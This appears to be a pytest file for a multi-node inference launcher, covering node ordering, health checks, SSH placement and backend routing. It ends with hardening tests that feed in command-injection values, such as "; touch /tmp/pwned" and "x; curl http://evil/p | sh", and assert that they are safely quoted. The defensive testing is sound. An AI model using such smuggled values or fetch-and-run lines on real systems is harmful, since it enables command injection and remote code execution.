def test_pick_head_first_orders_local_first(monkeypatch):
    lm = _load_script_module("lm_test_pick", "launch_multinode.py")
    monkeypatch.setattr(
        lm.ray.util,
        "get_node_ip_address",
        lambda: "10.0.0.1",
    )
    nodes = [
        {"NodeManagerAddress": "10.0.0.2", "NodeID": "b"},
        {"NodeManagerAddress": "10.0.0.1", "NodeID": "a"},
    ]
    ordered = lm._pick_head_first(nodes)
    assert ordered[0]["NodeManagerAddress"] == "10.0.0.1"
    assert ordered[1]["NodeManagerAddress"] == "10.0.0.2"


def test_pick_head_first_fallback_sorts_when_local_missing(monkeypatch):
    lm = _load_script_module("lm_test_pick2", "launch_multinode.py")
    monkeypatch.setattr(
        lm.ray.util,
        "get_node_ip_address",
        lambda: "192.168.99.99",
    )
    nodes = [
        {"NodeManagerAddress": "10.0.0.2", "NodeID": "b"},
        {"NodeManagerAddress": "10.0.0.1", "NodeID": "a"},
    ]
    ordered = lm._pick_head_first(nodes)
    addrs = [n["NodeManagerAddress"] for n in ordered]
    assert addrs == sorted(addrs)


def test_wait_for_nodes_returns_when_enough_gpu_nodes(monkeypatch):
    lm = _load_script_module("lm_test_wait_ok", "launch_multinode.py")
    sample = [
        {"Alive": True, "Resources": {"GPU": 1.0}},
        {"Alive": True, "Resources": {"GPU": 1.0}},
    ]
    monkeypatch.setattr(lm.ray, "nodes", lambda: sample)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    got = lm._wait_for_nodes(2, timeout_s=10)
    assert len(got) == 2


def test_wait_for_nodes_times_out(monkeypatch):
    lm = _load_script_module("lm_test_wait_to", "launch_multinode.py")
    one = [{"Alive": True, "Resources": {"GPU": 1.0}}]
    monkeypatch.setattr(lm.ray, "nodes", lambda: one)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    times = iter([0.0, 0.0, 200.0])

    def _mono():
        return next(times)

    monkeypatch.setattr(lm.time, "monotonic", _mono)
    try:
        lm._wait_for_nodes(3, timeout_s=120)
    except RuntimeError as exc:
        assert "only 1/3" in str(exc)
    else:
        raise AssertionError("expected RuntimeError")


def test_launch_main_rejects_nnodes_below_two(monkeypatch):
    lm = _load_script_module("lm_test_main_nnodes", "launch_multinode.py")
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "launch_multinode.py",
            "--framework",
            "sglang",
            "--model",
            "/m",
            "--tp",
            "1",
            "--nnodes",
            "1",
            "--pid-dir",
            "/tmp",
            "--log-dir",
            "/tmp",
        ],
    )
    assert lm.main() == 2


def test_spawn_remote_vllm_worker_writes_sentinel_pid(tmp_path):
    lm = _load_script_module("lm_test_spawn_vllm", "launch_multinode.py")
    pid_dir = tmp_path / "p"
    log_dir = tmp_path / "l"
    rc = lm._spawn_remote(
        framework="vllm",
        model="/m",
        tp=8,
        nnodes=2,
        node_rank=1,
        head_ip="127.0.0.1",
        dist_init_port=5000,
        pid_dir=str(pid_dir),
        log_dir=str(log_dir),
        extra_args=[],
    )
    assert rc == 0
    assert (pid_dir / "rank_1.pid").read_text(encoding="utf-8") == "0"


def test_wait_health_true_on_200(monkeypatch):
    lm = _load_script_module("lm_test_health", "launch_multinode.py")
    calls = {"n": 0}

    class _Resp:
        status = 200

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

    def _urlopen(*_a, **_k):
        calls["n"] += 1
        return _Resp()

    monkeypatch.setattr(
        "urllib.request.urlopen",
        _urlopen,
    )
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    assert lm._wait_health(timeout_s=30) is True
    assert calls["n"] == 1


def test_wait_health_false_on_timeout(monkeypatch):
    lm = _load_script_module("lm_test_health2", "launch_multinode.py")

    def _urlopen(*_a, **_k):
        raise OSError("down")

    monkeypatch.setattr("urllib.request.urlopen", _urlopen)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    times = iter([0.0, 100.0])

    def _mono():
        return next(times)

    monkeypatch.setattr(lm.time, "monotonic", _mono)
    assert lm._wait_health(timeout_s=5) is False


def test_infera_ssh_port_role_stride_and_idle_entrypoint():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support
    from hyperloom.inference_optimizer.multi_node._internal.ssh_client import DEFAULT_SSH_PORT

    assert infera_support.ssh_port_for_pod("prefill", 0) == DEFAULT_SSH_PORT
    assert infera_support.ssh_port_for_pod("decode", 0) == DEFAULT_SSH_PORT + infera_support.INFERA_SSH_PORT_ROLE_STRIDE
    assert infera_support.ssh_port_for_pod("prefill", 0, ssh_port_base=2222) == 2222
    assert infera_support.ssh_port_for_pod("decode", 0, ssh_port_base=2222) == 2232
    assert infera_support.ssh_port_for_pod("worker", 1, ssh_port_base=2222) == 2223
    prefill_ep = infera_support.idle_worker_entrypoint(role="prefill", ssh_port_base=2222)
    decode_ep = infera_support.idle_worker_entrypoint(role="decode", ssh_port_base=2222)
    assert "2222" in prefill_ep and "LWS_WORKER_INDEX" in prefill_ep
    assert "2232" in decode_ep
    default_prefill_ep = infera_support.idle_worker_entrypoint(role="prefill")
    assert str(DEFAULT_SSH_PORT) in default_prefill_ep


def test_infera_disagg_flags_and_launch_args():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    df = infera_support.disagg_flags("prefill", "nixl")
    assert "--disaggregation-mode prefill" in df
    assert "--disaggregation-transfer-backend nixl" in df
    assert "30001" in df
    assert infera_support.disagg_flags("bogus", "nixl") == ""

    la = infera_support.build_node_launch_args(
        framework="sglang",
        model="/m",
        tp=8,
        nnodes=1,
        disagg_mode="decode",
        kv_transfer_backend="nixl",
    )
    assert "--extra-args" in la and "decode" in la


# ---------------------------------------------------------------------------
# infera_support pure-helper tests (Infera backend SSH fan-out).


def test_infera_build_node_launch_args_sglang_and_kill_only():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    a = infera_support.build_node_launch_args(
        framework="sglang",
        model="/m/x",
        tp=16,
        nnodes=2,
        ep=16,
        extra_args="--mem-fraction-static 0.7",
    )
    assert "--framework sglang" in a
    assert "--tp 16" in a and "--nnodes 2" in a and "--ep 16" in a
    # Rank is self-determined pod-side from $LWS_WORKER_INDEX, never encoded.
    assert "--node-rank" not in a
    assert "--extra-args" in a and "0.7" in a

    k = infera_support.build_node_launch_args(
        framework="vllm",
        model="",
        tp=0,
        nnodes=2,
        kill_only=True,
    )
    assert "--kill-only" in k and "--framework vllm" in k
    assert "--model" not in k


# ---------------------------------------------------------------------------
# Infera kernel ops routing/isolation (apply-patch / kernel-bench / install-geak).


def test_resolve_geak_src_resolution_order(monkeypatch):
    from hyperloom.inference_optimizer.multi_node.commands import infera as mn_infera

    monkeypatch.delenv("HYPERLOOM_GEAK_SRC", raising=False)
    monkeypatch.delenv("HYPERLOOM_ROOT", raising=False)
    monkeypatch.delenv("USER_DATA_PATH", raising=False)
    assert mn_infera._resolve_geak_src("/x/geak") == "/x/geak"  # explicit wins
    monkeypatch.setenv("USER_DATA_PATH", "/data")
    assert mn_infera._resolve_geak_src(None) == "/data/runtime/geak"
    monkeypatch.setenv("HYPERLOOM_ROOT", "/r")
    assert mn_infera._resolve_geak_src(None) == "/r/geak"
    monkeypatch.setenv("HYPERLOOM_GEAK_SRC", "/explicit/geak")
    assert mn_infera._resolve_geak_src(None) == "/explicit/geak"


def test_apply_patch_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
    # backend=infera -> _infera_apply_patch; backend=rayjob -> legacy head_pod_ip
    # path (EXIT_CONFIG_ERROR without head_pod_ip). Proves isolation.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    monkeypatch.setattr(mn_cli, "_infera_apply_patch", lambda a: 4242)

    ns = argparse.Namespace(
        patch_file="/p",
        target_path="/t",
        backup_dir="/b",
        kernel_id="k",
        timeout_sec=60,
        print_logs=False,
        poll_interval=6,
        poll_timeout=110,
    )
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_apply_patch(ns) == 4242  # routed to infera

    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_apply_patch(ns) == mn_cli.EXIT_CONFIG_ERROR  # legacy path


def test_kernel_bench_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    monkeypatch.setattr(mn_cli, "_infera_kernel_bench", lambda a: 7777)

    ns = argparse.Namespace(
        workspace="/w",
        bench_command="true",
        files_b64_json="{}",
        result_glob="*.json",
        timeout_sec=60,
        print_logs=False,
        poll_interval=6,
        poll_timeout=110,
    )
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_kernel_bench(ns) == 7777
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_kernel_bench(ns) == mn_cli.EXIT_CONFIG_ERROR


def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
    # The provisioner hook must be a no-op (0) for non-infera backends.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    assert mn_cli.install_geak_on_pods_best_effort() == 0


def test_install_geak_noop_for_rayjob(tmp_path, monkeypatch):
    # GEAK SSH install is Infera-only; RayJob kernel-agent uses the Ray runtime.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    assert mn_cli.install_geak_on_pods_best_effort() == 0


# ---------------------------------------------------------------------------
# infera_ssh_env_from_state isolation tests (kernel-agent GEAK SSH placement).


def _write_mn_state(tmp_path, monkeypatch, payload):
    import json as _json

    sp = tmp_path / "mn_state.json"
    sp.write_text(_json.dumps(payload), encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    return sp


def test_infera_ssh_env_empty_for_rayjob(tmp_path, monkeypatch):
    # RayJob backend (or single-node) must yield {} so the Ray RAY_ADDRESS
    # placement path is left completely untouched.
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "rayjob",
            "nodes": 2,
            "head_pod_ip": "10.0.0.1",
            "ray_address": "10.0.0.1:6379",
        },
    )
    assert _multi_node_env.infera_ssh_env_from_state() == {}


def test_infera_ssh_env_aggregated_picks_worker_pod(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "pd_mode": "aggregated",
            "worker_pod_ips": ["10.0.1.0", "10.0.1.1"],
            "ssh_key_path": "/tmp/mn_ssh/k",
            "ssh_port": 2222,
        },
    )
    env = _multi_node_env.infera_ssh_env_from_state()
    assert env["KERNEL_AGENT_GPU_PLACEMENT"] == "ssh"
    assert env["MN_SSH_HOST"] == "10.0.1.0"
    assert env["MN_SSH_PORT"] == "2222"
    assert env["MN_SSH_KEY"] == "/tmp/mn_ssh/k"


def test_infera_ssh_env_pd_picks_prefill_then_decode(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "pd_mode": "disaggregated",
            "prefill_pod_ips": ["10.0.2.0"],
            "decode_pod_ips": ["10.0.3.0"],
            "ssh_key_path": "/tmp/mn_ssh/k",
            "ssh_port": 2222,
        },
    )
    env = _multi_node_env.infera_ssh_env_from_state()
    assert env["MN_SSH_HOST"] == "10.0.2.0"  # prefill first
    assert env["MN_SSH_PORT"] == "2222"


def test_infera_ssh_env_empty_without_pods_or_key(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "worker_pod_ips": [],
            "ssh_key_path": "/tmp/k",
        },
    )
    assert _multi_node_env.infera_ssh_env_from_state() == {}


# ---------------------------------------------------------------------------
# magpie_remote_env accuracy-gate interpreter tests.


def test_magpie_remote_env_pins_eval_interpreter(tmp_path, monkeypatch):
    """The eval must run in the interpreter preflight installed lm_eval into.

    Magpie's ``magpie_run_eval_remote_direct`` runs ``${MAGPIE_EVAL_PYTHON:-python3}``
    and has no InferenceX shim to install the harness for itself, so a bare PATH
    ``python3`` would look for lm_eval in a different interpreter than preflight
    installed it into and fail the gate on a box preflight called ready.
    """
    _write_mn_state(tmp_path, monkeypatch, {"backend": "rayjob", "nodes": 2, "service_url": "http://h:8888"})
    monkeypatch.setattr(mne, "external_service_url", lambda: "")
    monkeypatch.setattr(
        "hyperloom.orchestrator.actions.executors.benchmark_backend.resolve_benchmark_interpreter",
        lambda: "/opt/venv/bin/python",
    )

    env = mne.magpie_remote_env()

    assert env["MAGPIE_EVAL_PYTHON"] == "/opt/venv/bin/python"
    assert env["BENCHMARK_BASE_URL"] == "http://h:8888"


def test_magpie_remote_env_pins_eval_interpreter_external(tmp_path, monkeypatch):
    """The platform hand-off path needs the same pin as the state-file path."""
    _write_mn_state(tmp_path, monkeypatch, {"nodes": 2})
    monkeypatch.setattr(mne, "external_service_url", lambda: "http://frontend:8000")
    monkeypatch.setattr(
        "hyperloom.orchestrator.actions.executors.benchmark_backend.resolve_benchmark_interpreter",
        lambda: "/opt/venv/bin/python",
    )

    env = mne.magpie_remote_env()

    assert env["MAGPIE_EVAL_PYTHON"] == "/opt/venv/bin/python"
    assert env["BENCHMARK_BASE_URL"] == "http://frontend:8000"


def test_magpie_remote_env_empty_for_single_node(tmp_path, monkeypatch):
    """Single-node stays untouched: no client phase, no interpreter override."""
    _write_mn_state(tmp_path, monkeypatch, {"backend": "rayjob", "nodes": 1})
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "1")
    monkeypatch.setattr(mne, "external_service_url", lambda: "")

    assert mne.magpie_remote_env() == {}


# ---------------------------------------------------------------------------
# _write_rayjob_meta sidecar JSON tests.


def _write_meta_kwargs(**overrides):
    """Default kwargs for _write_rayjob_meta calls under test."""
    defaults = dict(
        wid="wid-abc",
        workspace="ws-a",
        session_id="sess-1",
        owner_id="owner-1",
        display_name="demo",
        nodes=2,
        gpus_per_node=8,
    )
    defaults.update(overrides)
    return defaults


def test_ray_gcs_address_from_state_prefers_ray_address(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = tmp_path / "state.json"
    p.write_text(
        json.dumps({"ray_address": "10.1.2.3:6379", "head_pod_ip": "10.9.9.9"}),
        encoding="utf-8",
    )
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    assert mne.ray_gcs_address_from_state() == "10.1.2.3:6379"


def test_ray_gcs_address_from_state_fallback_head(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = tmp_path / "state.json"
    p.write_text(json.dumps({"head_pod_ip": "10.1.2.4"}), encoding="utf-8")
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    assert mne.ray_gcs_address_from_state() == "10.1.2.4:6379"


def test_export_ray_address_to_os(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    p = tmp_path / "state.json"
    p.write_text(json.dumps({"head_pod_ip": "10.0.0.5"}), encoding="utf-8")
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "2")
    # The head IP reaches a multi-node run through the hand-off, so supply it
    # that way: state for >= 2 nodes is refused without one.
    monkeypatch.setenv("HYPERLOOM_MN_EXT_SERVICE_URL", "http://head:8888")
    monkeypatch.setenv("HYPERLOOM_MN_EXT_HEAD_IP", "10.0.0.5")
    monkeypatch.setenv("INFERENCE_OPTIMIZER_MN_BACKEND", "rayjob")
    monkeypatch.delenv("RAY_ADDRESS", raising=False)
    mne.export_ray_address_to_os()
    assert os.environ.get("RAY_ADDRESS") == "10.0.0.5:6379"


def test_subcommand_state_refuses_multi_node_without_handoff(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """A stale state file must not stand in for a cluster hand-off.

    The guard sits on the subcommand entry, not on the raw state read: callers
    that only ask about multi-node configuration must stay unaffected.
    """
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
    from hyperloom.inference_optimizer.multi_node._internal import external_state

    p = tmp_path / "state.json"
    p.write_text(json.dumps({"external": True, "head_pod_ip": "10.0.0.5"}), encoding="utf-8")
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    monkeypatch.delenv("HYPERLOOM_MN_EXT_SERVICE_URL", raising=False)

    # Triggered by the run declaring multi-node ...
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "2")
    with pytest.raises(RuntimeError, match="without a cluster hand-off"):
        mn_cli._load_state()

    # ... and by the file itself claiming to describe a handed-over cluster,
    # which is what a standalone subcommand sees.
    monkeypatch.delenv("INFERENCE_OPTIMIZER_NODES", raising=False)
    with pytest.raises(RuntimeError, match="describes a handed-over cluster"):
        mn_cli._load_state()

    # The raw read stays lenient so config-only callers keep working.
    assert external_state.load_multi_node_state()["head_pod_ip"] == "10.0.0.5"


# ---------------------------------------------------------------------------
# Multi-node control-plane hardening (shell-quoting + credential minimization).


def test_multinode_entrypoint_shlex_quotes_malicious_value():
    """A shell-metacharacter kernel_id must be shlex-quoted into the Ray Dashboard entrypoint (no command injection)."""
    import shlex

    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    evil = "k'; touch /tmp/pwned #"
    ep = mn_cli._build_multinode_apply_patch_entrypoint("/t/x", "QUJD", "/bak", evil, 60)
    # The value is carried, but only as a single shlex-quoted token.
    assert shlex.quote(evil) in ep
    # The raw ``--kernel-id k'; touch ...`` (unquoted) form must NOT appear.
    assert f"--kernel-id {evil}" not in ep


def test_restart_entrypoint_shlex_quotes_model(monkeypatch):
    """SWSPLAT-42404: a shell-metacharacter model must be shlex-quoted into the
    head-pod launch entrypoint (single argv token, no command injection)."""
    import shlex

    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    monkeypatch.setattr(mn_cli, "_read_pod_script", lambda name: f"# {name}\n")
    evil = "m'; touch /tmp/pwned #"
    ns = argparse.Namespace(
        framework="sglang",
        model=evil,
        tp=8,
        no_wait_health=False,
        extra_args="",
    )
    ep = mn_cli._build_restart_entrypoint(ns, "/tmp/x.pid", "/tmp/x.log")
    assert shlex.quote(evil) in ep
    # The raw unquoted metacharacter model must NOT appear as a bare token.
    assert f"launch_server.sh sglang {evil}" not in ep


def test_restart_entrypoint_neutralizes_malicious_extra_args(monkeypatch):
    """A shell-metacharacter extra_args must not inject a second command into
    the restart entrypoint; the `;` stays inside a quoted argv token."""
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    monkeypatch.setattr(mn_cli, "_read_pod_script", lambda name: f"# {name}\n")
    ns = argparse.Namespace(
        framework="sglang",
        model="m",
        tp=8,
        no_wait_health=False,
        extra_args="--foo 1; touch /tmp/pwned",
    )
    ep = mn_cli._build_restart_entrypoint(ns, "/tmp/x.pid", "/tmp/x.log")
    # The raw injection form (a bare `; touch`) must NOT appear as shell syntax.
    assert "1; touch /tmp/pwned" not in ep
    # The metacharacter is confined to a single quoted token.
    assert "'1;'" in ep


def test_restart_entrypoint_preserves_legit_multi_token_extra_args(monkeypatch):
    """Legitimate multi-token extra_args survive unchanged (no functional
    regression from the shell-safe re-quoting)."""
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    monkeypatch.setattr(mn_cli, "_read_pod_script", lambda name: f"# {name}\n")
    ns = argparse.Namespace(
        framework="sglang",
        model="m",
        tp=8,
        no_wait_health=False,
        extra_args="--mem-fraction-static 0.85 --enable-torch-compile",
    )
    ep = mn_cli._build_restart_entrypoint(ns, "/tmp/x.pid", "/tmp/x.log")
    assert "-- --mem-fraction-static 0.85 --enable-torch-compile" in ep


def test_multinode_launch_entrypoint_neutralizes_malicious_extra_args(monkeypatch):
    """Multi-node RayJob restart must shell-safe --extra-args like single-node."""
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    monkeypatch.setattr(mn_cli, "_read_pod_script", lambda name: f"# {name}\n")
    ns = argparse.Namespace(
        framework="sglang",
        model="m",
        tp=8,
        no_wait_health=False,
        extra_args="--foo 1; touch /tmp/pwned",
        ep=1,
        pd_mode="aggregated",
    )
    ep = mn_cli._build_multinode_launch_entrypoint(ns, nnodes=2, pid_dir="/tmp/pids", log_dir="/tmp/logs")
    assert "1; touch /tmp/pwned" not in ep
    assert "'1;'" in ep


def test_infera_build_node_launch_args_neutralizes_malicious_extra_args():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    la = infera_support.build_node_launch_args(
        framework="sglang",
        model="/m",
        tp=8,
        nnodes=1,
        extra_args="--foo 1; touch /tmp/pwned",
    )
    assert "1; touch /tmp/pwned" not in la
    assert "'1;'" in la


def test_infera_build_node_launch_args_rejects_denied_extra_args():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support
    from hyperloom.inference_optimizer.multi_node._internal.server_args_safety import ServerArgsRejected

    with pytest.raises(ServerArgsRejected, match="denied server flags"):
        infera_support.build_node_launch_args(
            framework="sglang",
            model="/m",
            tp=8,
            nnodes=1,
            extra_args="--model-path /evil",
        )


def test_multinode_op_args_shlex_quotes_malicious_value():
    """The Infera SSH op_args builder path (bench) must also shlex-quote."""
    import shlex

    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    evil = "x; curl http://evil/p | sh"
    ns = argparse.Namespace(
        workspace="/w",
        bench_command=evil,
        files_b64_json="{}",
        result_glob="*.json",
        timeout_sec=60,
    )
    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
    )
    assert shlex.quote(evil) in ep
    assert f"--bench-command {evil}" not in ep


def _bootstrap_sh() -> Path:
    return _repo_root() / "multi_node" / "scripts" / "bootstrap.sh"


def test_bootstrap_renders_env_file_path_only_no_credentials(tmp_path):
    """bootstrap.sh must render ENV_FILE with the venv PATH only, never creds.

    Regression guard for the fix that stopped writing *_API_KEY / *_BASE_URL
    into the world-readable /etc/profile.d/hyperloom-env.sh: credentials present
    in the process env must NOT leak into the rendered file.
    """
    # Fake framework venv with an executable python3 so section 1 resolves.
    venv = tmp_path / "venv"
    (venv / "bin").mkdir(parents=True)
    py = venv / "bin" / "python3"
    py.write_text("#!/usr/bin/env bash\nexit 0\n", encoding="utf-8")
    py.chmod(0o755)

    env_file = tmp_path / "hyperloom-env.sh"
    secrets = {
        "AMD_LLM_API_KEY": "secret-amd",
        "ANTHROPIC_API_KEY": "secret-anthropic",
        "OPENAI_API_KEY": "secret-openai",
        "ANTHROPIC_BASE_URL": "https://secret.example/v1",
    }
    env = {
        **os.environ,
        "HYPERLOOM_VENV": str(venv),
        "ENV_FILE": str(env_file),
        "BOOTSTRAP_MARKER": str(tmp_path / "bootstrap_done"),
        "LOG_DIR": str(tmp_path / "log"),
        **secrets,
    }
    proc = subprocess.run(
        ["bash", str(_bootstrap_sh())],
        env=env,
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0, proc.stderr

    rendered = env_file.read_text(encoding="utf-8")
    assert f'export PATH="{venv}/bin:${{PATH}}"' in rendered
    # Neither the credential keys nor their values may appear in the 0644 file.
    for key, val in secrets.items():
        assert key not in rendered
        assert val not in rendered
    assert (env_file.stat().st_mode & 0o777) == 0o644
